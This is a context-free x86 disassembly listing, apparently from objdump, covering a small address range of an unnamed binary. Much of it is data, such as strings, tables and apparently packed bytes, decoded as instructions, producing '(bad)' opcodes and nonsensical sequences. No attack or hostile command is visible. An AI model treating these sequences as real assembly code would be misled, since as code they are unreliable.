  42195b:	mov    bl,BYTE PTR [eax+0x780717e2]
  421961:	pop    esp
  421962:	call   0xcada374d
  421967:	test   BYTE PTR [eax],al
  421969:	add    BYTE PTR [eax],al
  42196b:	add    BYTE PTR [eax],al
  42196d:	add    cl,bl
  42196f:	ret    0x4905
  421972:	pop    ds
  421973:	iret   
  421974:	fst    st(2)
  421976:	enter  0xf86f,0xd2
  42197a:	inc    edx
  42197b:	imul   ecx,DWORD PTR [edi-0x6c],0xd
  42197f:	in     al,0x1
  421981:	add    BYTE PTR [edx+0x0],ah
  421984:	add    BYTE PTR [eax],al
  421986:	fnclex 
  421988:	jb     0x421a09
  42198a:	in     eax,0x25
  42198c:	lea    eax,[esi-0x7327e70b]
  421992:	sti    
  421993:	push   ss
  421994:	dec    esi
  421995:	data16 aam 0x51
  421998:	and    al,0xfd
  42199a:	pop    ebx
  42199b:	mov    al,0x42
  42199d:	jns    0x421a1a
  42199f:	adc    BYTE PTR [ebp+0x7f],cl
  4219a2:	rcr    DWORD PTR [ebp+ebx*8+0x62a72e7f],0xf3
  4219aa:	mov    dh,0x2e
  4219ac:	fld    st(3)
  4219ae:	(bad)  [edi*1-0x1495313b]
  4219b5:	sub    eax,0xb3ede56
  4219ba:	inc    edx
  4219bb:	call   0xa885:0x672beb10
  4219c2:	xor    eax,0xae952258
  4219c7:	(bad)  [ebp+0xd]
  4219ca:	shl    DWORD PTR [edx],0x51
  4219cd:	icebp  
  4219ce:	stc    
  4219cf:	inc    esp
  4219d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219d1:	mov    ah,BYTE PTR [edi+0x6ba715d4]
  4219d7:	shl    BYTE PTR [ebp+0x789b230f],1
  4219dd:	sbb    al,BYTE PTR [edx+0x23]
  4219e0:	or     bh,0xd
  4219e3:	xlat   BYTE PTR ds:[ebx]
  4219e4:	lea    esi,[edx+0xd6dd]
  4219ea:	add    BYTE PTR [eax],al
  4219ec:	add    BYTE PTR [eax],al
  4219ee:	popa   
  4219ef:	pop    edi
  4219f0:	lock (bad) 
  4219f2:	(bad)  
  4219f3:	out    dx,eax
  4219f4:	repz pop edi
  4219f6:	mov    dl,0xc5
  4219f8:	ret    
  4219f9:	in     eax,dx
  4219fa:	fsubr  QWORD PTR ds:0xe46f4f8c
  421a00:	add    DWORD PTR [eax],eax
  421a02:	sbb    eax,0xad000000
  421a07:	js     0x42199b
  421a09:	xchg   esi,eax
  421a0a:	pop    edx
  421a0b:	pop    es
  421a0c:	cli    
  421a0d:	out    dx,eax
  421a0e:	cmp    al,0xf5
  421a10:	inc    edi
  421a11:	into   
  421a12:	and    eax,0xeb68b4dc
  421a17:	js     0x421a51
  421a19:	inc    ebx
  421a1a:	cmp    ah,bh
  421a1c:	ret    
  421a1d:	xchg   esp,eax
  421a1e:	dec    ecx
  421a1f:	clc    
  421a20:	mov    cl,0xff
  421a22:	or     al,0x0
	...
  421a2c:	add    BYTE PTR [eax],al
  421a2e:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421a34:	inc    edx
  421a35:	add    BYTE PTR [eax],cl
  421a37:	nop
  421a38:	inc    edx
  421a39:	add    BYTE PTR [eax+edx*4],cl
  421a3c:	inc    edx
  421a3d:	add    BYTE PTR [eax],dl
  421a3f:	nop
  421a40:	inc    edx
  421a41:	add    BYTE PTR [eax+edx*4],dl
  421a44:	inc    edx
  421a45:	add    BYTE PTR [eax],bl
  421a47:	nop
  421a48:	inc    edx
  421a49:	add    BYTE PTR [eax+edx*4],bl
  421a4c:	inc    edx
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	mov    al,ds:0xa0040042
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	mov    al,ds:0xa00c0042
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	mov    al,ds:0xa0140042
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	mov    al,ds:0xa01c0042
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax],al
  421a6f:	mov    al,0x42
  421a71:	add    BYTE PTR [eax+esi*4],al
  421a74:	inc    edx
  421a75:	add    BYTE PTR [eax],cl
  421a77:	mov    al,0x42
  421a79:	add    BYTE PTR [eax+esi*4],cl
  421a7c:	inc    edx
  421a7d:	add    BYTE PTR [eax],dl
  421a7f:	mov    al,0x42
  421a81:	add    BYTE PTR [eax+esi*4],dl
  421a84:	inc    edx
  421a85:	add    BYTE PTR [eax],bl
  421a87:	mov    al,0x42
  421a89:	add    BYTE PTR [eax+esi*4],bl
  421a8c:	inc    edx
  421a8d:	add    BYTE PTR [eax+0x66],bh
  421a90:	ins    BYTE PTR es:[edi],dx
  421a91:	jp     0x421aea
  421a93:	jbe    0x421adc
  421a95:	ja     0x421ada
  421a97:	js     0x421ae1
  421a99:	jno    0x421afe
  421a9b:	inc    edx
  421a9c:	inc    bx
  421a9e:	push   ebp
  421a9f:	jno    0x421b17
  421aa1:	ja     0x421b0a
  421aa3:	dec    edi
  421aa4:	dec    esp
  421aa5:	dec    ebp
  421aa6:	inc    edx
  421aa7:	jno    0x421b1a
  421aa9:	jae    0x421afe
  421aab:	push   eax
  421aac:	arpl   WORD PTR [ebx+0x56],dx
  421aaf:	push   ds
  421ab0:	inc    edx
  421ab1:	add    BYTE PTR [esi+0x1e],bl
  421ab4:	inc    edx
  421ab5:	add    dh,dh
  421ab7:	sbb    al,0x42
  421ab9:	add    bh,ch
  421abb:	or     esi,DWORD PTR [edx+0x304e790e]
  421ac1:	dec    esi
  421ac2:	xchg   DWORD PTR [edi+0x3d],ecx
  421ac5:	dec    esi
  421ac6:	scas   eax,DWORD PTR es:[edi]
  421ac7:	dec    edi
  421ac8:	ds dec esi
  421aca:	js     0x421b1a
  421acc:	cmp    ecx,DWORD PTR [esi-0x64]
  421acf:	dec    edi
  421ad0:	inc    esp
  421ad1:	dec    esi
  421ad2:	jae    0x421b22
  421ad4:	inc    ecx
  421ad5:	dec    esi
  421ad6:	xor    BYTE PTR [esi+0x40],cl
  421ad9:	dec    esi
  421ada:	pop    esp
  421adb:	pop    ebp
  421adc:	pop    edi
  421add:	push   edx
  421ade:	cmp    DWORD PTR [esi+0x79],ecx
  421ae1:	dec    esi
  421ae2:	xor    BYTE PTR [esi-0x79],cl
  421ae5:	dec    edi
  421ae6:	cmp    eax,0x3e4faf4e
  421aeb:	dec    esi
  421aec:	js     0x421b3c
  421aee:	cmp    ecx,DWORD PTR [esi-0x64]
  421af1:	dec    edi
  421af2:	inc    esp
  421af3:	dec    esi
  421af4:	mov    DWORD PTR [edi+0x41],ecx
  421af7:	dec    esi
  421af8:	xor    BYTE PTR [esi+0x40],cl
  421afb:	dec    esi
  421afc:	pop    esp
  421afd:	ins    DWORD PTR es:[edi],dx
  421afe:	pop    edi
  421aff:	bound  edi,QWORD PTR [ecx]
  421b01:	dec    esi
  421b02:	jns    0x421b52
  421b04:	xor    BYTE PTR [esi-0x80],cl
  421b07:	dec    edi
  421b08:	cmp    eax,0x394e734e
  421b0d:	dec    esi
  421b0e:	mov    ds:0x304e3a4f,al
  421b13:	dec    esi
  421b14:	inc    esi
  421b15:	dec    esi
  421b16:	pop    esp
  421b17:	jge    0x421b78
  421b19:	jb     0x421b8a
  421b1b:	sub    BYTE PTR [esi-0x7d],0x7e
  421b1f:	xchg   ebx,eax
  421b20:	jns    0x421ab2
  421b22:	aas    
  421b23:	dec    esi
  421b24:	test   BYTE PTR [edi+0x30],cl
  421b27:	dec    esi
  421b28:	test   BYTE PTR [edi+0x3c],cl
  421b2b:	dec    esi
  421b2c:	mov    ds:0x734e394f,al
  421b31:	dec    esi
  421b32:	inc    ebp
  421b33:	dec    esi
  421b34:	xor    BYTE PTR [esi+0x44],cl
  421b37:	dec    esi
  421b38:	pop    esp
  421b39:	lea    ebx,[edi-0x7e]
  421b3c:	outs   dx,DWORD PTR ds:[esi]
  421b3d:	xchg   edx,eax
  421b3e:	outs   dx,BYTE PTR ds:[esi]
  421b3f:	xchg   ebx,eax
  421b40:	jle    0x421ae5
  421b42:	jns    0x421ae4
  421b44:	aas    
  421b45:	dec    esi
  421b46:	test   BYTE PTR [edi+0x30],cl
  421b49:	dec    esi
  421b4a:	test   BYTE PTR [edi+0x3c],cl
  421b4d:	dec    esi
  421b4e:	mov    ds:0x894e394f,al
  421b53:	dec    edi
  421b54:	inc    ebp
  421b55:	dec    esi
  421b56:	xor    BYTE PTR [esi+0x44],cl
  421b59:	dec    esi
  421b5a:	pop    esp
  421b5b:	popf   
  421b5c:	pop    edi
  421b5d:	xchg   edx,eax
  421b5e:	outs   dx,DWORD PTR ds:[esi]
  421b5f:	mov    ds:0xb37ea36e,al
  421b64:	jns    0x421b16
  421b66:	aas    
  421b67:	dec    esi
  421b68:	mov    cs,WORD PTR [edi+0x30]
  421b6b:	dec    esi
  421b6c:	lods   al,BYTE PTR ds:[esi]
  421b6d:	dec    edi
  421b6e:	cmp    eax,0x394e734e
  421b73:	dec    esi
  421b74:	mov    eax,ds:0x304e3a4f
  421b79:	dec    esi
  421b7a:	inc    esp
  421b7b:	dec    esi
  421b7c:	pop    esp
  421b7d:	lods   eax,DWORD PTR ds:[esi]
  421b7e:	pop    edi
  421b7f:	mov    ds:0xb36eb26f,al
  421b84:	jle    0x421b49
  421b86:	jns    0x421b48
  421b88:	aas    
  421b89:	dec    esi
  421b8a:	mov    cs,WORD PTR [edi+0x30]
  421b8d:	dec    esi
  421b8e:	lods   al,BYTE PTR ds:[esi]
  421b8f:	dec    edi
  421b90:	cmp    eax,0x394e7e4e
  421b95:	dec    esi
  421b96:	lahf   
  421b97:	dec    edi
  421b98:	cmp    ecx,DWORD PTR [esi+0x30]
  421b9b:	dec    esi
  421b9c:	inc    ebp
  421b9d:	dec    esi
  421b9e:	pop    esp
  421b9f:	mov    ebp,0xc26fb25f
  421ba4:	outs   dx,BYTE PTR ds:[esi]
  421ba5:	ret    
  421ba6:	jle    0x421b7b
  421ba8:	jns    0x421b7a
  421baa:	aas    
  421bab:	dec    esi
  421bac:	mov    cs,WORD PTR [edi+0x30]
  421baf:	dec    esi
  421bb0:	lods   al,BYTE PTR ds:[esi]
  421bb1:	dec    edi
  421bb2:	cmp    eax,0x394f804e
  421bb7:	dec    esi
  421bb8:	lods   al,BYTE PTR ds:[esi]
  421bb9:	dec    edi
  421bba:	cmp    cl,BYTE PTR [esi+0x30]
  421bbd:	dec    esi
  421bbe:	inc    esi
  421bbf:	dec    esi
  421bc0:	pop    esp
  421bc1:	int    0x5f
  421bc3:	ret    0xd26f
  421bc6:	outs   dx,BYTE PTR ds:[esi]
  421bc7:	sar    DWORD PTR [esi-0x1d],cl
  421bca:	jns    0x421bac
  421bcc:	aas    
  421bcd:	dec    esi
  421bce:	mov    cs,WORD PTR [edi+0x30]
  421bd1:	dec    esi
  421bd2:	lods   al,BYTE PTR ds:[esi]
  421bd3:	dec    edi
  421bd4:	cmp    eax,0x394f834e
  421bd9:	dec    esi
  421bda:	mov    ds:0x304e3a4f,al
  421bdf:	dec    esi
  421be0:	inc    esp
  421be1:	dec    esi
  421be2:	pop    esp
  421be3:	fstp   QWORD PTR [edi-0x2e]
  421be6:	outs   dx,DWORD PTR ds:[esi]
  421be7:	loop   0x421c57
  421be9:	jecxz  0x421c69
  421beb:	repz jns 0x421bde
  421bee:	aas    
  421bef:	dec    esi
  421bf0:	lea    ecx,[edi+0x30]
  421bf3:	dec    esi
  421bf4:	lahf   
  421bf5:	dec    edi
  421bf6:	cmp    eax,0x3c4fa04e
  421bfb:	dec    esi
  421bfc:	xor    BYTE PTR [esi+0x3f],cl
  421bff:	dec    esi
  421c00:	pop    esp
  421c01:	in     eax,dx
  421c02:	pop    edi
  421c03:	loop   0x421c74
  421c05:	repnz outs dx,BYTE PTR ds:[esi]
  421c07:	repz jle 0x421c0d
  421c0a:	jns    0x421c0c
  421c0c:	jle    0x421c21
  421c0e:	jns    0x421c20
  421c10:	cmp    al,0x4e
  421c12:	jg     0x421c62
  421c14:	xor    BYTE PTR [esi-0x65],cl
  421c17:	dec    edi
  421c18:	xor    cl,BYTE PTR [esi-0x80]
  421c1b:	dec    edi
  421c1c:	cmp    al,0x4e
  421c1e:	lods   eax,DWORD PTR ds:[esi]
  421c1f:	dec    edi
  421c20:	cmp    ecx,DWORD PTR [esi+0x30]
  421c23:	dec    esi
  421c24:	inc    ebp
  421c25:	dec    esi
  421c26:	pop    esp
  421c27:	or     eax,0x126f025f
  421c2c:	outs   dx,BYTE PTR ds:[esi]
  421c2d:	adc    edi,DWORD PTR [esi+0x23]
  421c30:	jns    0x421c52
  421c32:	aas    
  421c33:	dec    esi
  421c34:	add    BYTE PTR [eax],al
  421c36:	mov    esi,0xb200421a
  421c3b:	sbb    al,0x42
  421c3d:	add    BYTE PTR [edx+0x6200421c],bh
  421c43:	push   ds
  421c44:	inc    edx
  421c45:	add    dh,cl
  421c47:	sbb    eax,0x1e520042
  421c4c:	inc    edx
  421c4d:	add    BYTE PTR [edx-0x61ffbde4],bl
  421c53:	sbb    al,0x42
  421c55:	add    BYTE PTR [esi+0x1e],cl
  421c58:	inc    edx
  421c59:	add    BYTE PTR [edx],al
  421c5b:	sbb    eax,0xa90d0042
  421c60:	pushf  
  421c61:	clc    
  421c62:	ss mov edx,0x1cb6f89c
  421c68:	inc    edx
  421c69:	add    BYTE PTR [esi-0x65ffbde3],al
  421c6f:	sbb    eax,0x1da60042
  421c74:	inc    edx
  421c75:	add    BYTE PTR [esi-0x11ffbde3],dh
  421c7b:	sbb    al,0x42
  421c7d:	add    BYTE PTR [edx+0xe00421a],bh
  421c83:	sbb    eax,0x1cfe0042
  421c88:	inc    edx
  421c89:	add    BYTE PTR [esi+0x1e],ah
  421c8c:	inc    edx
  421c8d:	add    BYTE PTR [esi+0x19f89c85],dh
  421c93:	or     edx,DWORD PTR [edi]
  421c95:	add    edx,0x1400421c
  421c9b:	sbb    al,0x16
  421c9d:	or     DWORD PTR [eax],0x7050d
  421ca3:	add    BYTE PTR [eax+0x0],al
  421ca6:	cmp    al,BYTE PTR [edx+0x3e]
  421ca9:	ds enter 0x4279,0x0
  421cae:	ins    DWORD PTR es:[edi],dx
  421caf:	push   ebp
  421cb0:	inc    esp
  421cb1:	imul   ecx,DWORD PTR [eax],0x86275fa
  421cb7:	in     eax,dx
  421cb8:	inc    BYTE PTR [edi]
  421cba:	aas    
  421cbb:	cli    
  421cbc:	mov    ds:0x421caa05,eax
  421cc1:	add    BYTE PTR [ebp-0x4a07636b],dh
  421cc7:	xchg   esi,eax
  421cc8:	pushf  
  421cc9:	clc    
  421cca:	mov    ah,0x95
  421ccc:	pushf  
  421ccd:	clc    
  421cce:	mov    ebx,0xbaf89c95
  421cd3:	xchg   ebp,eax
  421cd4:	pushf  
  421cd5:	clc    
  421cd6:	mov    ecx,0xb8f89c95
  421cdb:	xchg   ebp,eax
  421cdc:	pushf  
  421cdd:	clc    
  421cde:	mov    edi,0xbef89c95
  421ce3:	xchg   ebp,eax
  421ce4:	pushf  
  421ce5:	clc    
  421ce6:	mov    ebp,0xa6f89c95
  421ceb:	xchg   ebp,eax
  421cec:	pushf  
  421ced:	clc    
  421cee:	jmp    0x421a:0xb26003f9
  421cf5:	add    BYTE PTR [eax+eax*2+0x42],ch
  421cf9:	add    BYTE PTR [ebx+0x77],dl
  421cfc:	jbe    0x421d4e
  421cfe:	mov    dh,0x85
  421d00:	pushf  
  421d01:	clc    
  421d02:	sbb    ecx,ebp
  421d04:	push   eax
  421d05:	pop    es
  421d06:	sbb    BYTE PTR [ebx],cl
  421d08:	add    BYTE PTR [eax],al
  421d0a:	scas   al,BYTE PTR es:[edi]
  421d0b:	sbb    al,BYTE PTR [edx+0x0]
  421d0e:	sbb    ecx,DWORD PTR [ebx]
  421d10:	add    al,0xe
	...
  421d42:	ins    BYTE PTR es:[edi],dx
  421d43:	inc    eax
  421d44:	inc    edx
  421d45:	add    BYTE PTR [esi+0x66f89c85],dh
  421d4b:	add    BYTE PTR [edx+0x0],ch
  421d4e:	add    BYTE PTR [si+0x0],ah
  421d52:	push   0x64006700
  421d57:	add    BYTE PTR [esi+0x0],ah
  421d5a:	push   0x0
  421d5c:	push   0x66006400
  421d61:	add    BYTE PTR [edi+0x0],ah
  421d64:	push   0x0
  421d66:	push   0x66006700
  421d6b:	add    BYTE PTR [eax+0x0],ch
  421d6e:	add    BYTE PTR [bp+0x0],ah
  421d72:	push   0x66006700
	...
  421d7f:	add    BYTE PTR [eax],al
  421d81:	add    BYTE PTR [ecx-0x5affbfa4],cl
  421d87:	dec    edi
  421d88:	lahf   
  421d89:	dec    edi
  421d8a:	mov    ds:0x9f4fa64f,al
  421d8f:	dec    edi
  421d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d91:	dec    edi
  421d92:	ins    DWORD PTR es:[edi],dx
  421d93:	dec    esi
  421d94:	bound  ecx,QWORD PTR [esi+0x30]
  421d97:	dec    esi
  421d98:	add    BYTE PTR [eax],al
  421d9a:	cdq    
  421d9b:	dec    edi
  421d9c:	pushf  
  421d9d:	dec    edi
  421d9e:	fwait
  421d9f:	dec    edi
  421da0:	ins    DWORD PTR es:[edi],dx
  421da1:	dec    esi
  421da2:	bound  ecx,QWORD PTR [esi+0x30]
  421da5:	dec    esi
  421da6:	scas   eax,DWORD PTR es:[edi]
  421da7:	dec    edi
  421da8:	lods   eax,DWORD PTR ds:[esi]
  421da9:	dec    edi
  421daa:	lahf   
  421dab:	dec    edi
  421dac:	mov    ds:0x624e6d4f,al
  421db1:	dec    esi
  421db2:	xor    BYTE PTR [esi+0x0],cl
  421db5:	add    BYTE PTR [ebp-0x5bb067b1],ch
  421dbb:	dec    edi
  421dbc:	test   eax,0xa04f934f
  421dc1:	dec    edi
  421dc2:	fwait
  421dc3:	dec    edi
  421dc4:	xor    BYTE PTR [esi+0x0],cl
  421dc7:	add    BYTE PTR [eax],al
  421dc9:	add    BYTE PTR [eax],al
  421dcb:	add    BYTE PTR [eax],al
  421dcd:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  421dd4:	mov    WORD PTR [ebp-0x32734274],gs
  421dda:	mov    ebp,ds
  421ddc:	mov    ebp,gs
  421dde:	mov    ebp,?
  421de0:	mov    WORD PTR ds:0x2d8c1d8c,cs
  421de6:	mov    WORD PTR ds:0x6d8c5d8c,?
  421dec:	mov    WORD PTR [edx-0x74],?
  421def:	jae    0x421d7d
  421df1:	jo     0x421d7f
  421df3:	jno    0x421d81
  421df5:	jbe    0x421d83
  421df7:	ja     0x421d85
  421df9:	je     0x421d87
  421dfb:	jne    0x421d89
  421dfd:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  421e04:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  421e0a:	lods   al,BYTE PTR ds:[esi]
  421e0b:	jge    0x421dc9
  421e0d:	jge    0x421dad
  421e0f:	(bad)  
  421e10:	jns    0x421e85
  421e12:	mov    ecx,0x7d738cb1
  421e17:	ins    DWORD PTR es:[edi],dx
  421e18:	enter  0x9fc6,0x26
  421e1c:	jb     0x421e21
  421e1e:	test   eax,0xb956bb17
  421e23:	hlt    
  421e24:	test   al,0x37
  421e26:	test   al,0x7e
  421e28:	fnstenv [ecx-0x6a]
  421e2b:	mov    cl,0x6a
  421e2d:	push   0xffffffce
  421e2f:	or     BYTE PTR [edx],bl
  421e31:	xlat   BYTE PTR ds:[ebx]
  421e32:	out    dx,eax
  421e33:	add    eax,0x9321d7aa
  421e38:	scas   al,BYTE PTR es:[edi]
  421e39:	adc    DWORD PTR [esi],esp
  421e3b:	jge    0x421e60
  421e3d:	fidiv  WORD PTR [edi]
  421e3f:	leave  
  421e40:	hlt    
  421e41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e42:	cmp    ax,0x1fc8
  421e46:	mov    dh,cl
  421e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e49:	(bad)  
  421e4a:	and    DWORD PTR [eax],ebx
  421e4c:	and    DWORD PTR [ecx-0x18],esi
  421e4f:	(bad)  [ebx+0x7]
  421e52:	cmc    
  421e53:	enter  0x301a,0x14
  421e57:	inc    eax
  421e58:	inc    edx
  421e59:	add    BYTE PTR [ecx+0x66],dh
  421e5c:	jp     0x421ecc
  421e5e:	mov    ds:0x600421c,al
  421e63:	sbb    eax,0xed080042
  421e68:	adc    al,BYTE PTR [edi]
  421e6a:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  421e71:	ins    BYTE PTR es:[edi],dx
  421e72:	push   0x49657557
  421e77:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  421e7d:	push   edi
  421e7e:	jp     0x421efa
  421e80:	dec    ebp
  421e81:	push   esi
  421e82:	arpl   WORD PTR gs:[ecx+0x45],si
  421e86:	dec    edx
  421e87:	dec    esi
  421e88:	data16 ja 0x421ed9
  421e8b:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
	...
  421ea6:	inc    ebp
  421ea7:	push   edx
  421ea8:	jb     0x421f1e
  421eaa:	inc    esi
  421eab:	je     0x421eee
  421ead:	inc    esi
  421eae:	jae    0x421f26
  421eb0:	dec    ebx
  421eb1:	gs dec ecx
  421eb3:	dec    ebp
  421eb4:	dec    ebp
  421eb5:	pop    edx
  421eb6:	jp     0x421f12
  421eb8:	jbe    0x421f00
  421eba:	pop    ecx
  421ebb:	jo     0x421f35
  421ebd:	inc    edi
  421ebe:	gs ins BYTE PTR es:[edi],dx
  421ec0:	dec    esp
  421ec1:	js     0x421f2b
  421ec3:	inc    edx
  421ec4:	js     0x421f0c
  421ec6:	dec    eax
  421ec7:	inc    ebp
  421ec8:	inc    esp
  421ec9:	inc    esp
  421eca:	push   ecx
  421ecb:	dec    edx
  421ecc:	ins    BYTE PTR es:[edi],dx
  421ecd:	dec    ebx
  421ece:	jbe    0x421f3e
  421ed0:	pop    eax
  421ed1:	jbe    0x421f1e
  421ed3:	inc    ecx
  421ed4:	fs gs jno 0x421f45
  421ed8:	push   ebx
  421ed9:	inc    ecx
  421eda:	add    BYTE PTR [eax],al
  421edc:	inc    ebx
  421edd:	outs   dx,BYTE PTR ds:[esi]
  421ede:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  421ee2:	push   edx
  421ee3:	push   ecx
  421ee4:	push   0x74000064
  421ee9:	jne    0x421f60
  421eeb:	ins    DWORD PTR es:[edi],dx
  421eec:	push   ecx
  421eed:	push   eax
  421eee:	jo     0x421f6a
  421ef0:	addr16 jo 0x421f49
  421ef3:	pop    eax
  421ef4:	add    BYTE PTR [eax],al
  421ef6:	push   ecx
  421ef7:	pop    ecx
  421ef8:	inc    ebx
  421ef9:	inc    edx
  421efa:	outs   dx,BYTE PTR ds:[esi]
  421efb:	popa   
  421efc:	imul   eax,DWORD PTR [edx+0x61],0x6b
  421f00:	jne    0x421f70
  421f02:	dec    ebx
  421f03:	je     0x421f68
  421f05:	bound  esp,QWORD PTR [edi+0x0]
  421f08:	jns    0x421f4f
  421f0a:	bound  ebp,QWORD PTR [ecx+0x46]
  421f0d:	dec    ecx
  421f0e:	ja     0x421f55
  421f10:	dec    eax
  421f11:	inc    ebp
  421f12:	inc    edx
  421f13:	push   ebx
  421f14:	add    BYTE PTR [eax],al
  421f16:	outs   dx,DWORD PTR ds:[esi]
  421f17:	inc    edi
  421f18:	dec    esi
  421f19:	outs   dx,DWORD PTR ds:[esi]
  421f1a:	pop    ecx
  421f1b:	inc    edi
  421f1c:	jb     0x421f65
  421f1e:	jns    0x421f96
  421f20:	inc    ecx
  421f21:	pop    eax
  421f22:	dec    esp
  421f23:	add    BYTE PTR [eax+0x48],bh
  421f26:	bound  edx,QWORD PTR [ebx+0x43]
  421f29:	pop    eax
  421f2a:	outs   dx,DWORD PTR ds:[esi]
  421f2b:	push   0x4355
  421f30:	dec    esp
  421f31:	ins    BYTE PTR es:[edi],dx
  421f32:	inc    edx
  421f33:	push   0x76666a73
  421f38:	inc    edx
  421f39:	jo     0x421f3b
  421f3b:	add    BYTE PTR [eax],al
  421f3d:	add    BYTE PTR [edi+0x6d],ah
  421f40:	je     0x421f89
  421f42:	ins    BYTE PTR es:[edi],dx
  421f43:	jae    0x421faf
  421f45:	inc    esi
  421f46:	ins    DWORD PTR es:[edi],dx
  421f47:	je     0x421f9f
  421f49:	push   0x56584178
  421f4e:	push   ebx
  421f4f:	addr16 dec edx
  421f51:	jo     0x421fc5
  421f53:	js     0x421fc4
  421f55:	pop    eax
  421f56:	dec    ebx
  421f57:	push   esp
  421f58:	dec    esp
  421f59:	jns    0x421fa6
  421f5b:	js     0x421fd5
  421f5d:	outs   dx,BYTE PTR ds:[esi]
  421f5e:	pop    ecx
  421f5f:	jae    0x421fcf
  421f61:	push   0x43644448
  421f66:	arpl   WORD PTR [edx+0x55],sp
  421f69:	push   0x42504e67
  421f6e:	push   ebp
  421f6f:	je     0x421fe6
  421f71:	addr16 dec edi
  421f73:	dec    esp
  421f74:	inc    edx
  421f75:	ins    DWORD PTR es:[edi],dx
  421f76:	inc    esi
  421f77:	inc    esi
  421f78:	inc    esi
  421f79:	arpl   WORD PTR [edx+0x47],bx
  421f7c:	push   ebp
  421f7d:	inc    ebx
  421f7e:	popa   
  421f7f:	push   edx
  421f80:	dec    esp
  421f81:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  421f88:	push   ecx
  421f89:	push   ebx
  421f8a:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  421f91:	dec    edx
  421f92:	jns    0x421ffd
  421f94:	push   edx
  421f95:	inc    ebx
  421f96:	jo     0x42200d
  421f98:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  421f9c:	fs push ebx
  421f9e:	inc    ebx
  421f9f:	push   ebp
  421fa0:	push   eax
  421fa1:	ja     0x421fde
  421fa3:	fisttp QWORD PTR [ebp+ebp*4-0x12]
  421fa7:	mov    ebp,0xa53ddffb
  421fac:	js     0x421f67
  421fae:	gs retf 
  421fb0:	call   0x6200:0x1d7095a
  421fb7:	add    BYTE PTR [eax],al
  421fb9:	add    BYTE PTR [eax],bh
  421fbb:	pop    ss
  421fbc:	repnz fdiv st(7),st
  421fbf:	cmp    ebx,DWORD PTR [edx]
  421fc1:	sub    ebp,DWORD PTR [esi+0x2d4794e]
  421fc7:	gs jp  0x421fe0
  421fca:	dec    ebp
  421fcb:	out    0xa,eax
  421fcd:	popf   
  421fce:	xchg   ch,ch
  421fd0:	scas   eax,DWORD PTR es:[edi]
  421fd1:	dec    ebx
  421fd2:	add    ah,BYTE PTR [edx+0x4c]
  421fd5:	out    dx,al
  421fd6:	push   ebp
  421fd7:	in     eax,0x1
  421fd9:	mov    bh,0xe3
  421fdb:	(bad)  
  421fdc:	jno    0x421fcb
  421fde:	jmp    0xc59f:0x1508e379
  421fe5:	xchg   edi,eax
  421fe6:	mov    ebx,0x4650a133
  421feb:	or     eax,0x7b291f5b
  421ff0:	inc    edx
  421ff1:	jns    0x422068
  421ff3:	out    0x5f,al
  421ff5:	dec    edx
  421ff6:	dec    esi
  421ff7:	ss mov edi,0xd30163f7
  421ffd:	mov    DWORD PTR ds:0x64574f5c,ecx
  422003:	fs nop
  422005:	jns    0x422048
  422007:	mov    bl,0x59
  422009:	in     eax,dx
  42200a:	cmp    esi,DWORD PTR [ecx+esi*1+0x38dd98fd]
  422011:	adc    DWORD PTR [ecx],ebx
  422013:	cmc    
  422014:	sbb    DWORD PTR [esi+esi*1],esp
  422017:	xchg   BYTE PTR [esp+ebp*1-0x53],cl
  42201b:	mov    DWORD PTR [eax],eax
  42201d:	add    BYTE PTR [eax],al
  42201f:	add    BYTE PTR [eax],al
  422021:	add    BYTE PTR [eax],ch
  422023:	mov    dl,0xa5
  422025:	push   edx
  422026:	mov    edi,0x7cfaff57
  42202b:	xlat   BYTE PTR fs:[ebx]
  42202d:	push   esi
  42202e:	shr    BYTE PTR [ebx],cl
  422030:	cmp    esp,ecx
  422032:	imul   edx,edi,0x1
  422035:	add    BYTE PTR [edx+0x0],ah
  422038:	add    BYTE PTR [eax],al
  42203a:	ins    DWORD PTR es:[edi],dx
  42203b:	inc    eax
  42203c:	mov    bl,0x1e
  42203e:	fwait
  42203f:	cmp    ecx,ebp
  422041:	pushf  
  422042:	xchg   edx,eax
  422043:	adc    al,0xc2
  422045:	sbb    al,0xce
  422047:	(bad)  
  422048:	mov    esp,0x44138167
  42204d:	mov    esp,0x794e6b45
  422052:	cmp    DWORD PTR [edi],ebx
  422054:	out    0xa0,eax
  422056:	add    BYTE PTR [ebp+edx*1+0x5a],dh
  42205a:	cmp    bl,BYTE PTR [edi]
  42205c:	adc    cl,BYTE PTR [ecx+0x18]
  42205f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422060:	or     BYTE PTR [edi+0x95e2113],0xb8
  422067:	and    cl,BYTE PTR [ebp+0x19]
  42206a:	fidiv  DWORD PTR [eax-0x20d8cade]
  422070:	push   0x66
  422072:	sub    ecx,DWORD PTR [ecx+edx*1]
  422075:	test   al,0xd5
  422077:	test   eax,0xa95ab502
  42207c:	(bad)  
  42207d:	cmp    al,0xf6
  42207f:	gs test eax,0x440ef61
  422085:	push   edi
  422086:	fdiv   QWORD PTR [edi]
  422088:	sub    DWORD PTR [edi-0x23],0x890fe87
  42208f:	cmp    BYTE PTR [esi-0x66],ch
  422092:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422094:	cmc    
  422095:	dec    ebp
  422096:	or     al,0xfa
  422098:	popa   
  422099:	xor    eax,0x915
  42209e:	add    BYTE PTR [eax],al
  4220a0:	add    BYTE PTR [eax],al
  4220a2:	mov    bl,0x55
